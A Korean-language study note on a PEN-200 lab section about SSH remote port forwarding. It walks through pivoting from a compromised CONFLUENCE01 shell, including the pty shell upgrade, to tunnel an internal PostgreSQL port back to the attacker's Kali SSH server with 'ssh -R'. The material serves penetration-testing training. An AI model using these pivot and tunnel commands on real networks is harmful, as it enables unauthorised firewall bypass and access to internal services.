# 19.3.3 SSH 원격 포워딩

> **SSH Remote Port Forwarding** · PEN-200 §19.3.3

앞의 두 방식은 **CONFLUENCE01 에 바인드한 포트에 Kali 가 접속할 수 있다**는 전제 위에 있었음. 현실에서는 이 전제가 자주 깨짐 — 인바운드는 아웃바운드보다 훨씬 엄격하게 통제됨. 반대로 대부분의 기업망은 업무·편의상 SSH 를 포함한 흔한 트래픽의 **바깥 방향**은 열어 둠. 즉 경계에 포트를 열어 받는 것은 어려워도 **SSH 로 나가는 것은 대체로 가능**함.

원격 포워딩은 그 비대칭을 쓰는 방식임. 리버스셸이 공격자 리스너로 되돌아오듯, 공격자가 통제하는 SSH 서버로 연결해 **리스닝 포트를 그쪽(SSH 서버)에** 여는 것임. 로컬·동적 포워딩과 방향이 정확히 뒤집힘:

- 리스닝 포트 — 로컬·동적은 SSH **클라이언트**, 원격은 SSH **서버**
- 패킷 전달 — 로컬·동적은 SSH **서버**, 원격은 SSH **클라이언트**

시나리오는 앞 절에서 방화벽이 추가된 것임. 포트를 어디에 바인드하든 Kali 에서 CONFLUENCE01 로 접속 가능한 것은 **TCP/8090 뿐**임. 목표는 PGDATABASE01 의 PostgreSQL(5432) 열거인데 CONFLUENCE01 에는 그 도구가 없음. 리스닝 포트를 CONFLUENCE01 에 여는 방식은 전부 막혔지만, CONFLUENCE01 에 SSH 클라이언트가 있고 Kali 를 SSH 서버로 세울 수 있음.

![[PEN200-Fig-277.png]]
*원격 포워딩 — Kali 루프백의 2345 로 들어온 패킷이 터널을 거꾸로 타고 CONFLUENCE01 에서 PGDATABASE01:5432 로 전달됨*

Kali 의 OpenSSH 서버는 설치돼 있으므로 `sudo systemctl start ssh` 로 켜기만 하면 됨. ⚠️ **켜기 전에 kali 사용자 비밀번호를 강하고 유일한 것으로 바꿀 것** — 인터넷 쪽으로 열리는 서비스임. 비밀번호 인증으로 붙으려면 `/etc/ssh/sshd_config` 의 `PasswordAuthentication` 을 `yes` 로 명시해야 할 수 있음.

```
kali@kali:~$ sudo systemctl start ssh
[sudo] password for kali:
```

*Kali 에서 `ss` 로 22 포트가 열린 것을 확인함*

```
kali@kali:~$ sudo ss -ntplu
Netid State  Recv-Q Send-Q Local Address:Port Peer Address:Port Process
tcp   LISTEN 0      128          0.0.0.0:22        0.0.0.0:*
users:(("sshd",pid=181432,fd=3))
tcp   LISTEN 0      128             [::]:22           [::]:*
users:(("sshd",pid=181432,fd=4))
```

`-R` 의 문법은 `-L` 과 같음 — 소켓 두 개를 콜론으로 잇고 **앞이 리스닝 소켓, 뒤가 전달 대상**임. 다만 리스닝 소켓이 열리는 곳이 SSH 서버(Kali)라는 점이 다름. Kali 루프백 2345 에 열고 PGDATABASE01 의 5432 로 보냄. 명령은 pty 를 붙인 CONFLUENCE01 셸에서 실행함.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ python3 -c 'import pty;
pty.spawn("/bin/sh")'
</bin$ python3 -c 'import pty; pty.spawn("/bin/bash")'
$ ssh -N -R 127.0.0.1:2345:10.4.50.215:5432 kali@192.168.118.4
< 127.0.0.1:2345:10.4.50.215:5432 kali@192.168.118.4
```

Kali 에서 `ss -ntplu` 를 치면 `127.0.0.1:2345` 가 LISTEN 상태로 잡힘.

```
kali@kali:~$ ss -ntplu
Netid State  Recv-Q Send-Q Local Address:Port Peer Address:PortProcess
tcp   LISTEN 0      128        127.0.0.1:2345      0.0.0.0:*
tcp   LISTEN 0      128          0.0.0.0:22        0.0.0.0:*
tcp   LISTEN 0      128             [::]:22           [::]:*
```
